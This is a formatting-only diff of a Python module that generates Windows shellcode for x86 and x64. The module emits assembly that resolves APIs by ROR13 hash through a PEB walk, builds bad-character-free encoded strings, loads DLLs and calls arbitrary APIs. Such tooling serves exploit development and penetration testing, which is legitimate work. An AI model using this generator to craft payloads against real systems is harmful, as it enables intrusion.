@@ -9,17 +9,19 @@ Handles generation of Windows shellgen with:
 
 Supports: x86, x64, ARM, ARM64
 """
+
 import sys
 from collections import OrderedDict
 
 from lib.color_printer import printer
-from ..encoders import encode_dword, string_to_push_dwords, ror13_hash
+
+from ..encoders import encode_dword, ror13_hash, string_to_push_dwords
 
 
 class WindowsGenerator:
     """Generator for Windows shellgen (x86, x64, ARM, ARM64)"""
 
-    def __init__(self, bad_chars, arch='x86'):
+    def __init__(self, bad_chars, arch="x86"):
         """
         Initialize the generator.
 
@@ -31,7 +33,7 @@ class WindowsGenerator:
         self.arch = arch.lower()
 
         # Validate architecture
-        if self.arch not in ['x86', 'x64', 'arm', 'arm64']:
+        if self.arch not in ["x86", "x64", "arm", "arm64"]:
             raise ValueError(f"Unsupported Windows architecture: {self.arch}")
 
     def gen_push_encoded_dword(self, dword, reg="eax", comment=""):
@@ -64,10 +66,10 @@ class WindowsGenerator:
         lines = []
         dwords = string_to_push_dwords(s)
 
-        lines.append(f"    ; Push string: \"{s}\"")
+        lines.append(f'    ; Push string: "{s}"')
 
         # Architecture-specific registers
-        if self.arch == 'x64':
+        if self.arch == "x64":
             ptr_reg = "rcx"
             sp_reg = "rsp"
             scratch_reg = "rax"
@@ -82,16 +84,22 @@ class WindowsGenerator:
                 lines.append(f"    xor {scratch_reg}, {scratch_reg}")
                 lines.append(f"    push {scratch_reg}               ; null terminator")
             else:
-                lines.append(self.gen_push_encoded_dword(dword, reg=scratch_reg, comment=f"part of \"{s[:20]}...\""))
+                lines.append(
+                    self.gen_push_encoded_dword(
+                        dword, reg=scratch_reg, comment=f'part of "{s[:20]}..."'
+                    )
+                )
 
-        lines.append(f"    mov {ptr_reg}, {sp_reg}            ; {ptr_reg} -> string on stack")
+        lines.append(
+            f"    mov {ptr_reg}, {sp_reg}            ; {ptr_reg} -> string on stack"
+        )
         if label:
             lines.append(f"    mov {label}, {ptr_reg}        ; save pointer for reuse")
         return "\n".join(lines)
 
     def gen_boilerplate(self):
         """Generate the reusable PEB walk + find_function subroutine (dispatches by arch)."""
-        if self.arch == 'x64':
+        if self.arch == "x64":
             return self.gen_boilerplate_x64()
         else:
             return self.gen_boilerplate_x86()
@@ -306,7 +314,7 @@ resolve_symbols_kernel32:
 
     def gen_load_dll(self, dll_name, ebp_offset):
         """Generate code to load a DLL and save its base at [rbp/ebp+offset]."""
-        if self.arch == 'x64':
+        if self.arch == "x64":
             return self.gen_load_dll_x64(dll_name, ebp_offset)
         else:
             return self.gen_load_dll_x86(dll_name, ebp_offset)
@@ -314,9 +322,13 @@ resolve_symbols_kernel32:
     def gen_load_dll_x86(self, dll_name, ebp_offset):
         """Generate x86 code to load a DLL and save its base at [ebp+offset]."""
         lines = []
-        lines.append(f"\n; ==========================================================================")
+        lines.append(
+            f"\n; =========================================================================="
+        )
         lines.append(f"; Load {dll_name}")
-        lines.append(f"; ==========================================================================")
+        lines.append(
+            f"; =========================================================================="
+        )
 
         # Push DLL name onto stack
         dll_dwords = string_to_push_dwords(dll_name)
@@ -324,7 +336,9 @@ resolve_symbols_kernel32:
         lines.append("    push eax                ; NULL terminator")
         for dw in reversed(dll_dwords):
             if dw != 0:
-                lines.append(self.gen_push_encoded_dword(dw, comment=f'part of "{dll_name}"'))
+                lines.append(
+                    self.gen_push_encoded_dword(dw, comment=f'part of "{dll_name}"')
+                )
 
         # Get pointer to the string (after all pushes)
         lines.append("    mov ecx, esp            ; ECX = pointer to DLL name")
@@ -337,9 +351,13 @@ resolve_symbols_kernel32:
     def gen_load_dll_x64(self, dll_name, rbp_offset):
         """Generate x64 code to load a DLL and save its base at [rbp+offset]."""
         lines = []
-        lines.append(f"\n; ==========================================================================")
+        lines.append(
+            f"\n; =========================================================================="
+        )
         lines.append(f"; Load {dll_name}")
-        lines.append(f"; ==========================================================================")
+        lines.append(
+            f"; =========================================================================="
+        )
 
         # Push DLL name onto stack (still need to build string)
         dll_dwords = string_to_push_dwords(dll_name)
@@ -347,7 +365,9 @@ resolve_symbols_kernel32:
         lines.append("    push rax                ; NULL terminator")
         for dw in reversed(dll_dwords):
             if dw != 0:
-                lines.append(self.gen_push_encoded_dword(dw, comment=f'part of "{dll_name}"'))
+                lines.append(
+                    self.gen_push_encoded_dword(dw, comment=f'part of "{dll_name}"')
+                )
 
         # x64 calling convention: RCX = first argument
         lines.append("    mov rcx, rsp            ; RCX = pointer to DLL name")
@@ -360,10 +380,14 @@ resolve_symbols_kernel32:
 
     def gen_resolve_function(self, api_name, dll_base_location, save_location):
         """Generate code to resolve a function by hash (dispatches by arch)."""
-        if self.arch == 'x64':
-            return self.gen_resolve_function_x64(api_name, dll_base_location, save_location)
+        if self.arch == "x64":
+            return self.gen_resolve_function_x64(
+                api_name, dll_base_location, save_location
+            )
         else:
-            return self.gen_resolve_function_x86(api_name, dll_base_location, save_location)
+            return self.gen_resolve_function_x86(
+                api_name, dll_base_location, save_location
+            )
 
     def gen_resolve_function_x86(self, api_name, dll_base_location, save_location):
         """
@@ -411,7 +435,7 @@ resolve_symbols_kernel32:
 
     def gen_exit_shellcode(self, api_to_offset):
         """Generate clean exit via TerminateProcess (dispatches by arch)."""
-        if self.arch == 'x64':
+        if self.arch == "x64":
             return self.gen_exit_shellcode_x64(api_to_offset)
         else:
             return self.gen_exit_shellcode_x86(api_to_offset)
@@ -424,26 +448,36 @@ resolve_symbols_kernel32:
             api_to_offset: Dict mapping API names to their EBP offsets
         """
         lines = []
-        lines.append("\n; ==========================================================================")
+        lines.append(
+            "\n; =========================================================================="
+        )
         lines.append("; Clean exit via TerminateProcess(GetCurrentProcess(), 0)")
-        lines.append("; ==========================================================================")
+        lines.append(
+            "; =========================================================================="
+        )
 
         # Get offsets for pre-resolved functions
         get_current_process_offset = api_to_offset.get("GetCurrentProcess")
         terminate_process_offset = api_to_offset.get("TerminateProcess")
 
         if not get_current_process_offset or not terminate_process_offset:
-            raise ValueError("Exit APIs not pre-resolved! GetCurrentProcess and TerminateProcess must be included in api_to_offset")
+            raise ValueError(
+                "Exit APIs not pre-resolved! GetCurrentProcess and TerminateProcess must be included in api_to_offset"
+            )
 
         # Call pre-resolved GetCurrentProcess
-        lines.append(f"    call dword ptr [ebp+0x{get_current_process_offset:02x}]  ; Call GetCurrentProcess")
+        lines.append(
+            f"    call dword ptr [ebp+0x{get_current_process_offset:02x}]  ; Call GetCurrentProcess"
+        )
         lines.append("    mov edi, eax          ; Save hProcess in EDI")
 
         # Call TerminateProcess(hProcess, 0)
         lines.append("    xor ecx, ecx")
         lines.append("    push ecx              ; exit code = 0")
         lines.append("    push edi              ; hProcess")
-        lines.append(f"    call dword ptr [ebp+0x{terminate_process_offset:02x}]  ; Call TerminateProcess")
+        lines.append(
+            f"    call dword ptr [ebp+0x{terminate_process_offset:02x}]  ; Call TerminateProcess"
+        )
 
         return "\n".join(lines)
 
@@ -455,20 +489,28 @@ resolve_symbols_kernel32:
             api_to_offset: Dict mapping API names to their RBP offsets
         """
         lines = []
-        lines.append("\n; ==========================================================================")
+        lines.append(
+            "\n; =========================================================================="
+        )
         lines.append("; Clean exit via TerminateProcess(GetCurrentProcess(), 0) - x64")
-        lines.append("; ==========================================================================")
+        lines.append(
+            "; =========================================================================="
+        )
 
         # Get offsets for pre-resolved functions
         get_current_process_offset = api_to_offset.get("GetCurrentProcess")
         terminate_process_offset = api_to_offset.get("TerminateProcess")
 
         if not get_current_process_offset or not terminate_process_offset:
-            raise ValueError("Exit APIs not pre-resolved! GetCurrentProcess and TerminateProcess must be included in api_to_offset")
+            raise ValueError(
+                "Exit APIs not pre-resolved! GetCurrentProcess and TerminateProcess must be included in api_to_offset"
+            )
 
         # Call pre-resolved GetCurrentProcess (no arguments)
         lines.append("    sub rsp, 0x20         ; Shadow space")
-        lines.append(f"    call qword ptr [rbp+0x{get_current_process_offset:02x}]  ; Call GetCurrentProcess")
+        lines.append(
+            f"    call qword ptr [rbp+0x{get_current_process_offset:02x}]  ; Call GetCurrentProcess"
+        )
         lines.append("    add rsp, 0x20         ; Clean up shadow space")
         lines.append("    mov r15, rax          ; Save hProcess in R15")
 
@@ -477,7 +519,9 @@ resolve_symbols_kernel32:
         lines.append("    mov rcx, r15          ; RCX = hProcess")
         lines.append("    xor rdx, rdx          ; RDX = exit code = 0")
         lines.append("    sub rsp, 0x20         ; Shadow space")
-        lines.append(f"    call qword ptr [rbp+0x{terminate_process_offset:02x}]  ; Call TerminateProcess")
+        lines.append(
+            f"    call qword ptr [rbp+0x{terminate_process_offset:02x}]  ; Call TerminateProcess"
+        )
         lines.append("    add rsp, 0x20         ; Clean up shadow space")
 
         return "\n".join(lines)
@@ -493,11 +537,20 @@ resolve_symbols_kernel32:
         string_usage = {}
         for call in calls:
             for arg in call["args"]:
-                if isinstance(arg, str) and not arg.startswith("REG:") and not arg.startswith("STR_PTR:") and not arg.startswith("MEM:"):
+                if (
+                    isinstance(arg, str)
+                    and not arg.startswith("REG:")
+                    and not arg.startswith("STR_PTR:")
+                    and not arg.startswith("MEM:")
+                ):
                     string_usage[arg] = string_usage.get(arg, 0) + 1
 
         # Identify strings used more than once
-        reused_strings = {s: f"[ebp-{(i+1)*4}]" for i, (s, count) in enumerate(string_usage.items()) if count > 1}
+        reused_strings = {
+            s: f"[ebp-{(i+1)*4}]"
+            for i, (s, count) in enumerate(string_usage.items())
+            if count > 1
+        }
 
         # Update calls to reference cached strings
         updated_calls = []
@@ -531,9 +584,13 @@ resolve_symbols_kernel32:
             tuple: (assembly_code, api_to_offset_map)
         """
         lines = []
-        lines.append("\n; ==========================================================================")
+        lines.append(
+            "\n; =========================================================================="
+        )
         lines.append("; Pre-resolve all APIs upfront")
-        lines.append("; ==========================================================================")
+        lines.append(
+            "; =========================================================================="
+        )
 
         api_to_offset = {}
         current_offset = 0x14  # Start after boilerplate offsets
@@ -568,16 +625,28 @@ resolve_symbols_kernel32:
 
         # First, resolve all kernel32 APIs (base already loaded in boilerplate)
         if "kernel32.dll" in dll_to_apis:
-            if self.arch == 'x64':
-                lines.append("\n; Resolve kernel32.dll APIs (kernel32/kernelbase base at [rbp+0x20])")
+            if self.arch == "x64":
+                lines.append(
+                    "\n; Resolve kernel32.dll APIs (kernel32/kernelbase base at [rbp+0x20])"
+                )
                 for api_name in dll_to_apis["kernel32.dll"]:
-                    lines.append(self.gen_resolve_function(api_name, "[rbp+0x20]", f"[rbp+0x{current_offset:02x}]"))
+                    lines.append(
+                        self.gen_resolve_function(
+                            api_name, "[rbp+0x20]", f"[rbp+0x{current_offset:02x}]"
+                        )
+                    )
                     api_to_offset[api_name] = current_offset
                     current_offset += 8  # x64 uses 8-byte pointers
             else:
-                lines.append("\n; Resolve kernel32.dll APIs (EBX already contains kernel32 base)")
+                lines.append(
+                    "\n; Resolve kernel32.dll APIs (EBX already contains kernel32 base)"
+                )
                 for api_name in dll_to_apis["kernel32.dll"]:
-                    lines.append(self.gen_resolve_function(api_name, "ebx", f"[ebp+0x{current_offset:02x}]"))
+                    lines.append(
+                        self.gen_resolve_function(
+                            api_name, "ebx", f"[ebp+0x{current_offset:02x}]"
+                        )
+                    )
                     api_to_offset[api_name] = current_offset
                     current_offset += 4
 
@@ -587,17 +656,33 @@ resolve_symbols_kernel32:
                 continue  # Already handled above
 
             # Load the DLL once
-            ptr_size = 8 if self.arch == 'x64' else 4
-            dll_offset = 0x30 + (len(loaded_dlls) * ptr_size) if self.arch == 'x64' else 0x0C + (len(loaded_dlls) * ptr_size)
+            ptr_size = 8 if self.arch == "x64" else 4
+            dll_offset = (
+                0x30 + (len(loaded_dlls) * ptr_size)
+                if self.arch == "x64"
+                else 0x0C + (len(loaded_dlls) * ptr_size)
+            )
             lines.append(self.gen_load_dll(dll_name, f"0x{dll_offset:02x}"))
             loaded_dlls[dll_name] = dll_offset
 
             # Resolve all APIs from this DLL
             for api_name in api_list:
-                if self.arch == 'x64':
-                    lines.append(self.gen_resolve_function(api_name, f"[rbp+0x{dll_offset:02x}]", f"[rbp+0x{current_offset:02x}]"))
+                if self.arch == "x64":
+                    lines.append(
+                        self.gen_resolve_function(
+                            api_name,
+                            f"[rbp+0x{dll_offset:02x}]",
+                            f"[rbp+0x{current_offset:02x}]",
+                        )
+                    )
                 else:
-                    lines.append(self.gen_resolve_function(api_name, f"[ebp+0x{dll_offset:02x}]", f"[ebp+0x{current_offset:02x}]"))
+                    lines.append(
+                        self.gen_resolve_function(
+                            api_name,
+                            f"[ebp+0x{dll_offset:02x}]",
+                            f"[ebp+0x{current_offset:02x}]",
+                        )
+                    )
                 api_to_offset[api_name] = current_offset
                 current_offset += ptr_size
 
@@ -605,10 +690,14 @@ resolve_symbols_kernel32:
 
     def gen_api_call_preresolve(self, api_name, args, api_offset, string_cache):
         """Generate assembly for calling a pre-resolved API (dispatches by arch)."""
-        if self.arch == 'x64':
-            return self.gen_api_call_preresolve_x64(api_name, args, api_offset, string_cache)
+        if self.arch == "x64":
+            return self.gen_api_call_preresolve_x64(
+                api_name, args, api_offset, string_cache
+            )
         else:
-            return self.gen_api_call_preresolve_x86(api_name, args, api_offset, string_cache)
+            return self.gen_api_call_preresolve_x86(
+                api_name, args, api_offset, string_cache
+            )
 
     def gen_api_call_preresolve_x86(self, api_name, args, api_offset, string_cache):
         """
@@ -632,11 +721,18 @@ resolve_symbols_kernel32:
         lines.append(f"\n; Prepare string arguments for {api_name}")
         reg_idx = 0
         for i, arg in enumerate(args):
-            if isinstance(arg, str) and not arg.startswith("STR_PTR:") and not arg.startswith("REG:") and not arg.startswith("MEM:"):
+            if (
+                isinstance(arg, str)
+                and not arg.startswith("STR_PTR:")
+                and not arg.startswith("REG:")
+                and not arg.startswith("MEM:")
+            ):
                 lines.append(self.gen_push_string(arg))
                 if reg_idx < len(string_registers):
                     reg = string_registers[reg_idx]
-                    lines.append(f"    mov {reg}, ecx         ; save pointer to \"{arg[:20]}...\"")
+                    lines.append(
+                        f'    mov {reg}, ecx         ; save pointer to "{arg[:20]}..."'
+                    )
                     string_to_reg[i] = reg
                     reg_idx += 1
                 else:
@@ -653,12 +749,16 @@ resolve_symbols_kernel32:
                     lines.append("    xor eax, eax")
                     lines.append("    push eax               ; arg = 0")
                 else:
-                    lines.append(self.gen_push_encoded_dword(arg, comment=f"arg = 0x{arg:x}"))
+                    lines.append(
+                        self.gen_push_encoded_dword(arg, comment=f"arg = 0x{arg:x}")
+                    )
             elif isinstance(arg, str) and arg.startswith("STR_PTR:"):
                 string_val = arg[8:]
                 if string_val in string_cache:
                     cached_reg = string_cache[string_val]
-                    lines.append(f"    push {cached_reg}          ; reused string pointer")
+                    lines.append(
+                        f"    push {cached_reg}          ; reused string pointer"
+                    )
                 else:
                     lines.append(self.gen_push_string(string_val))
                     lines.append("    push ecx               ; pointer to string arg")
@@ -671,7 +771,9 @@ resolve_symbols_kernel32:
             elif isinstance(arg, str):
                 if original_idx in string_to_reg:
                     reg = string_to_reg[original_idx]
-                    lines.append(f"    push {reg}               ; pointer to string arg")
+                    lines.append(
+                        f"    push {reg}               ; pointer to string arg"
+                    )
                 else:
                     lines.append(self.gen_push_string(arg))
                     lines.append("    push ecx               ; pointer to string arg")
@@ -708,22 +810,33 @@ resolve_symbols_kernel32:
         lines.append(f"\n; Prepare string arguments for {api_name} - x64")
         reg_idx = 0
         for i, arg in enumerate(args):
-            if isinstance(arg, str) and not arg.startswith("STR_PTR:") and not arg.startswith("REG:") and not arg.startswith("MEM:"):
+            if (
+                isinstance(arg, str)
+                and not arg.startswith("STR_PTR:")
+                and not arg.startswith("REG:")
+                and not arg.startswith("MEM:")
+            ):
                 lines.append(self.gen_push_string(arg))
                 if reg_idx < len(string_registers):
                     reg = string_registers[reg_idx]
-                    lines.append(f"    mov {reg}, rcx         ; save pointer to \"{arg[:20]}...\"")
+                    lines.append(
+                        f'    mov {reg}, rcx         ; save pointer to "{arg[:20]}..."'
+                    )
                     string_to_reg[i] = reg
                     reg_idx += 1
                 else:
                     # If we run out of registers, save to stack (rare case)
-                    lines.append(f"    push rcx               ; save string pointer on stack")
+                    lines.append(
+                        f"    push rcx               ; save string pointer on stack"
+                    )
                     string_to_reg[i] = f"[rsp+{(reg_idx - len(string_registers)) * 8}]"
 
         # x64 fastcall: RCX, RDX, R8, R9, then stack
         param_regs = ["rcx", "rdx", "r8", "r9"]
 
-        lines.append(f"\n; Setup arguments for {api_name} (x64 fastcall: RCX, RDX, R8, R9, stack)")
+        lines.append(
+            f"\n; Setup arguments for {api_name} (x64 fastcall: RCX, RDX, R8, R9, stack)"
+        )
 
         # Process arguments in order (not reversed like x86)
         for i, arg in enumerate(args):
@@ -735,33 +848,49 @@ resolve_symbols_kernel32:
                     if arg == 0:
                         lines.append(f"    xor {reg}, {reg}         ; arg {i+1} = 0")
                     else:
-                        lines.append(f"    mov {reg}, 0x{arg:x}    ; arg {i+1} = 0x{arg:x}")
+                        lines.append(
+                            f"    mov {reg}, 0x{arg:x}    ; arg {i+1} = 0x{arg:x}"
+                        )
                 elif isinstance(arg, str) and arg.startswith("STR_PTR:"):
                     string_val = arg[8:]
                     if string_val in string_cache:
                         cached_reg = string_cache[string_val]
-                        lines.append(f"    mov {reg}, {cached_reg}  ; arg {i+1} = cached string pointer")
+                        lines.append(
+                            f"    mov {reg}, {cached_reg}  ; arg {i+1} = cached string pointer"
+                        )
                     else:
                         lines.append(self.gen_push_string(string_val))
-                        lines.append(f"    mov {reg}, rcx           ; arg {i+1} = string pointer")
+                        lines.append(
+                            f"    mov {reg}, rcx           ; arg {i+1} = string pointer"
+                        )
                 elif isinstance(arg, str) and arg.startswith("MEM:"):
                     mem_ref = arg[4:]
-                    lines.append(f"    mov {reg}, {mem_ref}     ; arg {i+1} from memory")
+                    lines.append(
+                        f"    mov {reg}, {mem_ref}     ; arg {i+1} from memory"
+                    )
                 elif isinstance(arg, str) and arg.startswith("REG:"):
                     src_reg = arg.split(":")[1]
                     if src_reg != reg:
-                        lines.append(f"    mov {reg}, {src_reg}     ; arg {i+1} from register")
+                        lines.append(
+                            f"    mov {reg}, {src_reg}     ; arg {i+1} from register"
+                        )
                 elif isinstance(arg, str):
                     # String argument - get pointer from saved register
                     if i in string_to_reg:
                         src_reg = string_to_reg[i]
                         if src_reg.startswith("["):
-                            lines.append(f"    mov {reg}, {src_reg}     ; arg {i+1} = string pointer from stack")
+                            lines.append(
+                                f"    mov {reg}, {src_reg}     ; arg {i+1} = string pointer from stack"
+                            )
                         else:
-                            lines.append(f"    mov {reg}, {src_reg}     ; arg {i+1} = string pointer")
+                            lines.append(
+                                f"    mov {reg}, {src_reg}     ; arg {i+1} = string pointer"
+                            )
                     else:
                         lines.append(self.gen_push_string(arg))
-                        lines.append(f"    mov {reg}, rcx           ; arg {i+1} = string pointer")
+                        lines.append(
+                            f"    mov {reg}, rcx           ; arg {i+1} = string pointer"
+                        )
             else:
                 # Args 5+ go on stack (pushed in reverse order for proper stack layout)
                 # These will be handled in a second pass
@@ -778,32 +907,48 @@ resolve_symbols_kernel32:
                         lines.append("    xor rax, rax")
                         lines.append(f"    push rax               ; arg {i+1} = 0")
                     else:
-                        lines.append(self.gen_push_encoded_dword(arg, comment=f"arg {i+1} = 0x{arg:x}"))
+                        lines.append(
+                            self.gen_push_encoded_dword(
+                                arg, comment=f"arg {i+1} = 0x{arg:x}"
+                            )
+                        )
                 elif isinstance(arg, str) and arg.startswith("STR_PTR:"):
                     string_val = arg[8:]
                     if string_val in string_cache:
                         cached_reg = string_cache[string_val]
-                        lines.append(f"    push {cached_reg}          ; arg {i+1} = cached string")
+                        lines.append(
+                            f"    push {cached_reg}          ; arg {i+1} = cached string"
+                        )
                     else:
                         lines.append(self.gen_push_string(string_val))
-                        lines.append(f"    push rcx               ; arg {i+1} = string pointer")
+                        lines.append(
+                            f"    push rcx               ; arg {i+1} = string pointer"
+                        )
                 elif isinstance(arg, str) and arg.startswith("MEM:"):
                     mem_ref = arg[4:]
                     lines.append(f"    push {mem_ref}          ; arg {i+1} from memory")
                 elif isinstance(arg, str) and arg.startswith("REG:"):
                     src_reg = arg.split(":")[1]
-                    lines.append(f"    push {src_reg}          ; arg {i+1} from register")
+                    lines.append(
+                        f"    push {src_reg}          ; arg {i+1} from register"
+                    )
                 elif isinstance(arg, str):
                     if i in string_to_reg:
                         src_reg = string_to_reg[i]
                         if src_reg.startswith("["):
                             lines.append(f"    mov rax, {src_reg}")
-                            lines.append(f"    push rax               ; arg {i+1} = string pointer")
+                            lines.append(
+                                f"    push rax               ; arg {i+1} = string pointer"
+                            )
                         else:
-                            lines.append(f"    push {src_reg}         ; arg {i+1} = string pointer")
+                            lines.append(
+                                f"    push {src_reg}         ; arg {i+1} = string pointer"
+                            )
                     else:
                         lines.append(self.gen_push_string(arg))
-                        lines.append(f"    push rcx               ; arg {i+1} = string pointer")
+                        lines.append(
+                            f"    push rcx               ; arg {i+1} = string pointer"
+                        )
 
         # Shadow space + call
         lines.append(f"\n; Call {api_name} with shadow space")
@@ -816,7 +961,9 @@ resolve_symbols_kernel32:
             stack_cleanup += (len(args) - 4) * 8  # Each pushed arg is 8 bytes
 
         if stack_cleanup > 0:
-            lines.append(f"    add rsp, 0x{stack_cleanup:x}       ; Clean up shadow space + stack args")
+            lines.append(
+                f"    add rsp, 0x{stack_cleanup:x}       ; Clean up shadow space + stack args"
+            )
 
         return "\n".join(lines)
 
@@ -840,7 +987,9 @@ resolve_symbols_kernel32:
         output.append("; " + "=" * 70)
         output.append(f"; Auto-generated {self.arch.upper()} Windows Shellcode")
         output.append(f"; Architecture: {self.arch}")
-        output.append(f"; Bad chars: {{{', '.join(f'0x{b:02x}' for b in sorted(self.bad_chars))}}}")
+        output.append(
+            f"; Bad chars: {{{', '.join(f'0x{b:02x}' for b in sorted(self.bad_chars))}}}"
+        )
         output.append("; " + "=" * 70)
         output.append("")
 
@@ -849,27 +998,41 @@ resolve_symbols_kernel32:
 
         # Pre-resolve all APIs BEFORE pushing any data onto the stack
         # Include exit APIs (GetCurrentProcess, TerminateProcess) if do_exit=True
-        preresolve_code, api_to_offset = self.gen_pre_resolve_apis(calls, include_exit_apis=do_exit)
+        preresolve_code, api_to_offset = self.gen_pre_resolve_apis(
+            calls, include_exit_apis=do_exit
+        )
         output.append(preresolve_code)
         output.append("")
 
         # Push cached strings AFTER resolving APIs
         if string_cache:
-            output.append("\n; ==========================================================================")
+            output.append(
+                "\n; =========================================================================="
+            )
             output.append("; String cache (reused strings)")
-            output.append("; ==========================================================================")
+            output.append(
+                "; =========================================================================="
+            )
             for string_val, reg_name in string_cache.items():
                 output.append(self.gen_push_string(string_val))
-                output.append(f"    mov {reg_name}, ecx      ; cache pointer to \"{string_val[:30]}...\"")
+                output.append(
+                    f'    mov {reg_name}, ecx      ; cache pointer to "{string_val[:30]}..."'
+                )
             output.append("")
 
         # Call pre-resolved APIs
         for i, call in enumerate(calls):
             # Handle custom assembly blocks
             if call.get("custom_asm"):
-                output.append(f"\n; ==========================================================================")
-                output.append(f"; Call #{i+1}: {call['api']}({', '.join(str(a) for a in call['args'])})")
-                output.append(f"; ==========================================================================")
+                output.append(
+                    f"\n; =========================================================================="
+                )
+                output.append(
+                    f"; Call #{i+1}: {call['api']}({', '.join(str(a) for a in call['args'])})"
+                )
+                output.append(
+                    f"; =========================================================================="
+                )
                 output.append(call.get("custom_asm"))
                 output.append("")
                 continue
@@ -877,10 +1040,20 @@ resolve_symbols_kernel32:
             api_name = call["api"]
             api_offset = api_to_offset[api_name]
 
-            output.append(f"\n; ==========================================================================")
-            output.append(f"; Call #{i+1}: {api_name}({', '.join(str(a) for a in call['args'])})")
-            output.append(f"; ==========================================================================")
-            output.append(self.gen_api_call_preresolve(api_name, call["args"], api_offset, string_cache))
+            output.append(
+                f"\n; =========================================================================="
+            )
+            output.append(
+                f"; Call #{i+1}: {api_name}({', '.join(str(a) for a in call['args'])})"
+            )
+            output.append(
+                f"; =========================================================================="
+            )
+            output.append(
+                self.gen_api_call_preresolve(
+                    api_name, call["args"], api_offset, string_cache
+                )
+            )
             output.append("")
 
         # Exit
@@ -893,10 +1066,16 @@ resolve_symbols_kernel32:
         print("=" * 72, file=sys.stderr)
         print("SHELLCODE GENERATOR OUTPUT", file=sys.stderr)
         print("=" * 72, file=sys.stderr)
-        print(f"Bad characters: {{{', '.join(f'0x{b:02x}' for b in sorted(self.bad_chars))}}}", file=sys.stderr)
+        print(
+            f"Bad characters: {{{', '.join(f'0x{b:02x}' for b in sorted(self.bad_chars))}}}",
+            file=sys.stderr,
+        )
         print(f"API calls:      {len(calls)}", file=sys.stderr)
         for i, call in enumerate(calls):
-            print(f"  [{i+1}] {call['api']}({', '.join(str(a)[:50] for a in call['args'])})", file=sys.stderr)
+            print(
+                f"  [{i+1}] {call['api']}({', '.join(str(a)[:50] for a in call['args'])})",
+                file=sys.stderr,
+            )
         print(f"Clean exit:     {do_exit}", file=sys.stderr)
         if string_cache:
             print(f"Cached strings: {len(string_cache)}", file=sys.stderr)
@@ -908,11 +1087,17 @@ resolve_symbols_kernel32:
         for call in calls:
             hash_lines.append(f"{call['api']:18s}: 0x{ror13_hash(call['api']):08x}")
         if do_exit:
-            hash_lines.append(f"GetCurrentProcess : 0x{ror13_hash('GetCurrentProcess'):08x}")
-            hash_lines.append(f"TerminateProcess  : 0x{ror13_hash('TerminateProcess'):08x}")
+            hash_lines.append(
+                f"GetCurrentProcess : 0x{ror13_hash('GetCurrentProcess'):08x}"
+            )
+            hash_lines.append(
+                f"TerminateProcess  : 0x{ror13_hash('TerminateProcess'):08x}"
+            )
 
-        hash_content = '\n'.join(hash_lines)
+        hash_content = "\n".join(hash_lines)
         print()  # Add spacing
-        printer.print_panel(hash_content, title="ROR13 API Hashes", style="yellow", border_style="cyan")
+        printer.print_panel(
+            hash_content, title="ROR13 API Hashes", style="yellow", border_style="cyan"
+        )
 
         return full_asm
